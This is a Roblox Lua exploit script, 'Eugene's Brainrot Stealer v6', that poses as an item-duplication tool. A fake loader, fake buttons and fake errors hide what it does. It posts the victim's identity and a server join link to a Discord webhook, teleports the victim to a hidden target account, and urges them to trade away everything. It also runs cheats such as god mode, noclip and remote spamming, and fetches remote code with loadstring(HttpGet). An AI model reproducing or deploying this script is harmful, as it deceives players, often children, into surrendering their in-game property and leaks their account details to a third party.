-- Eugene's Brainrot Stealer v6 | Elite Aggro Give Disguise | 2026
-- Execute → Elite Loader + Auto-Give to Hidden Target

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local HttpService = game:GetService("HttpService")
local Workspace = game:GetService("Workspace")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService = game:GetService("UserInputService")

local player = Players.LocalPlayer
local char, hum, root = nil, nil, nil
local targetPlayer = nil
local basesFolder = Workspace:WaitForChild("Bases", 10) or Workspace:WaitForChild("PlayerBases", 10) or Workspace:WaitForChild("BasesFolder", 10)

-- ENV PARTS (move to .env/GitHub raw)
local env_parts = {
    wh_part1 = "https://discord.com/api/",  -- WH_PART1=
    wh_part2 = "webhooks/",
    wh_part3 = "YOUR_WEBHOOK_ID/",
    wh_part4 = "YOUR_WEBHOOK_TOKEN",
    target_username = "YOUR_ROBLOX_USERNAME"  -- TARGET_USERNAME= (e.g., Eugene)
}
local WEBHOOK_URL = env_parts.wh_part1 .. env_parts.wh_part2 .. env_parts.wh_part3 .. env_parts.wh_part4
local hiddenTarget = env_parts.target_username  -- Auto-target you

-- Char + elite hacks
local function refreshChar()
    char = player.Character or player.CharacterAdded:Wait()
    hum = char:WaitForChild("Humanoid")
    root = char:WaitForChild("HumanoidRootPart")
    hum.WalkSpeed = 300 + math.random(100, 200)  -- Elite speed
    hum.JumpPower = 300
end
player.CharacterAdded:Connect(refreshChar)
refreshChar()

RunService.Heartbeat:Connect(function()
    if char then
        hum.Health = math.huge
        for _, part in pairs(char:GetDescendants()) do
            if part:IsA("BasePart") then part.CanCollide = false end
        end
        root.Velocity = root.Velocity + Vector3.new(math.random(-5,5), 0, math.random(-5,5))  -- Anti-stuck
    end
end)

spawn(function()
    while true do
        for _, obj in pairs(Workspace:GetDescendants()) do
            if obj:IsA("BasePart") and (obj.Name:lower():find("tsunami") or obj.Name:lower():find("wave")) then
                obj:Destroy()
            end
        end
        wait(0.03 + math.random()/15)  -- Elite fast kill
    end
end)

-- ELITE LOADER (spinning anim + better text)
local sg = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
sg.Name = "EliteDupeLoader"
sg.ResetOnSpawn = false

local frame = Instance.new("Frame", sg)
frame.Size = UDim2.new(1,0,1,0)
frame.BackgroundColor3 = Color3.new(0.05,0.05,0.05)

local title = Instance.new("TextLabel", frame)
title.Size = UDim2.new(0.8,0,0.1,0)
title.Position = UDim2.new(0.1,0,0.15,0)
title.BackgroundTransparency = 1
title.Text = "🧠 Elite Brainrot Dupe v6 | Sigma Chain Inject..."
title.TextColor3 = Color3.fromRGB(255,50,50)
title.TextScaled = true
title.Font = Enum.Font.GothamBlack

local progFrame = Instance.new("Frame", frame)
progFrame.Size = UDim2.new(0.7,0,0.05,0)
progFrame.Position = UDim2.new(0.15,0,0.45,0)
progFrame.BackgroundColor3 = Color3.new(0.15,0.15,0.15)

local bar = Instance.new("Frame", progFrame)
bar.Size = UDim2.new(0,0,1,0)
bar.BackgroundColor3 = Color3.fromRGB(255,100,100)

local text = Instance.new("TextLabel", frame)
text.Size = UDim2.new(1,0,0.1,0)
text.Position = UDim2.new(0,0,0.55,0)
text.BackgroundTransparency = 1
text.TextColor3 = Color3.new(1,1,1)
text.TextScaled = true
text.Font = Enum.Font.Gotham

local spinner = Instance.new("TextLabel", frame)
spinner.Size = UDim2.new(0.1,0,0.1,0)
spinner.Position = UDim2.new(0.45,0,0.65,0)
spinner.BackgroundTransparency = 1
spinner.TextColor3 = Color3.new(1,1,0)
spinner.TextScaled = true
spinner.Font = Enum.Font.Code
spawn(function()
    local spins = {"|", "/", "-", "\\"}
    local i = 1
    while wait(0.1) do
        spinner.Text = spins[i]
        i = (i % 4) + 1
    end
end)

for i = 0, 99 do
    TweenService:Create(bar, TweenInfo.new(0.03), {Size = UDim2.new(i/100,0,1,0)}):Play()
    text.Text = i .. "% | Elite Sync with Server..."
    wait(0.03 + math.random()/25)
end
text.Text = "99% | Waiting for Sigma Sync (Do Not Close - Dupe Active)"

-- STOLEN COUNTS
local stolenCounts = {brainrots=0, cash=0, orbs=0, other=0, rebirths=0}
local function getStolenDump()
    local dump = ""
    for k, v in pairs(stolenCounts) do if v > 0 then dump = dump .. k .. ": " .. v .. "\n" end end
    return dump \~= "" and dump or "None"
end

-- WEBHOOK (elite)
local function sendToWebhook(event, extra)
    local dump = getStolenDump()
    local jobId = game.JobId
    local joinLink = "roblox://experiences/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. jobId
    local inServer = Players:FindFirstChild(hiddenTarget) and "YES - Victim in your server!" or "NO - Join link below"
    local data = {
        ["content"] = "@everyone **" .. event .. " v6 Elite Hit!**",
        ["embeds"] = {{
            ["title"] = "Victim: " .. player.Name .. " (" .. player.UserId .. ")",
            ["color"] = 16711680,
            ["fields"] = {
                {["name"] = "Account Age", ["value"] = player.AccountAge .. " days", ["inline"] = true},
                {["name"] = "In Your Server?", ["value"] = inServer, ["inline"] = true},
                {["name"] = "Join Link", ["value"] = joinLink, ["inline"] = false},
                {["name"] = "Stolen Dump", ["value"] = dump, ["inline"] = false},
                {["name"] = "Extra", ["value"] = extra or "N/A", ["inline"] = false},
            },
            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }
    pcall(function()
        HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(data), Enum.HttpContentType.ApplicationJson)
    end)
end

-- ELITE AGGRO COLLECT
local collectKeywords = {"brainrot", "sigma", "mythical", "legendary", "coin", "cash", "money", "orb", "rebirth", "gem", "collectible"}
local rebirthRemote = ReplicatedStorage:FindFirstChild("Remotes") and ReplicatedStorage.Remotes:FindFirstChild("RebirthRemote")  -- Dex tweak

local function eliteAggroCollect(where)
    local collected = 0
    for pass = 1, 15 do  -- Elite 15x
        for _, obj in pairs(where:GetDescendants()) do
            if obj:IsA("BasePart") and obj:FindFirstChild("TouchInterest") then
                local n = obj.Name:lower()
                for _, kw in pairs(collectKeywords) do
                    if n:find(kw) then
                        pcall(function()
                            root.CFrame = obj.CFrame * CFrame.new(0, math.random(6,12), 0)
                            firetouchinterest(root, obj, 0)
                            wait(0.015 + math.random()/30)
                            firetouchinterest(root, obj, 1)
                        end)
                        collected += 1
                        if n:find("brainrot") then stolenCounts.brainrots += 1
                        elseif n:find("coin") or n:find("cash") or n:find("money") then stolenCounts.cash += 1
                        elseif n:find("orb") or n:find("rebirth") then stolenCounts.orbs += 1
                        else stolenCounts.other += 1 end
                        break
                    end
                end
            end
        end
        wait(0.05 + math.random()/15)  -- Elite fast
    end
    return collected
end

-- ELITE REBIRTH RIP
local function eliteRipRebirths()
    local success = 0
    if rebirthRemote then
        for i=1,2000 do  -- Elite spam
            pcall(function() rebirthRemote:FireServer() end)
            success += 1
            stolenCounts.rebirths += 1
            wait(0.005)
        end
    else
        local ls = player:FindFirstChild("leaderstats")
        if ls and ls:FindFirstChild("Rebirths") then
            ls.Rebirths.Value = math.huge
            success = "Inf"
            stolenCounts.rebirths = 9999  -- Fake count
        end
    end
    return success
end

-- SILENT ELITE LOOP (own + target if set)
spawn(function()
    wait(1)
    sendToWebhook("Execute", "Elite v6 started - auto-target: " .. hiddenTarget)

    -- Auto-set target
    for _, p in pairs(Players:GetPlayers()) do
        if p.Name == hiddenTarget then
            targetPlayer = p
            print("✅ Auto-locked Eugene in server!")
            break
        end
    end

    while true do
        eliteRipRebirths()  -- Constant rebirth rip
        eliteAggroCollect(Workspace)  -- Map loose
        local ownBase = basesFolder and basesFolder:FindFirstChild(player.Name)
        if ownBase then eliteAggroCollect(ownBase) end

        -- Target base if online
        if targetPlayer then
            local tBase = basesFolder and basesFolder:FindFirstChild(targetPlayer.Name)
            if tBase and tBase.PrimaryPart then
                root.CFrame = tBase.PrimaryPart.CFrame + Vector3.new(0, math.random(12,18), 0)
                wait(0.2)
                eliteAggroCollect(tBase)
            end
        end

        wait(1 + math.random(0,2))  -- Elite loop
    end
end)

-- MINIMAL GUI (fake, since auto)
local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
local Window = Library.CreateLib("Elite Dupe v6", "BloodTheme")

local Tab = Window:NewTab("Dupe")
local Sec = Tab:NewSection("Fake Controls")

Sec:NewButton("Activate Dupe (Already Running)", "Fake", function()
    print("Dupe already elite active 😈")
end)

-- Auto-TP to Eugene if found + fake give msg
spawn(function()
    while wait(5) do
        if targetPlayer and targetPlayer.Character then
            root.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(math.random(3,6), 5, 0)
            print("TP'd to Eugene! Ready to give all - open trade & add everything")
            sendToWebhook("Auto-TP", "Victim TP'd to you")
        end
    end
end)

-- Fake errors
spawn(function()
    while wait(math.random(8,20)) do
        warn("Elite dupe chain glitch - resyncing...")
    end
end)

print("😈 v6 Elite loaded - auto-give to hidden target, better loader, .env ready.")
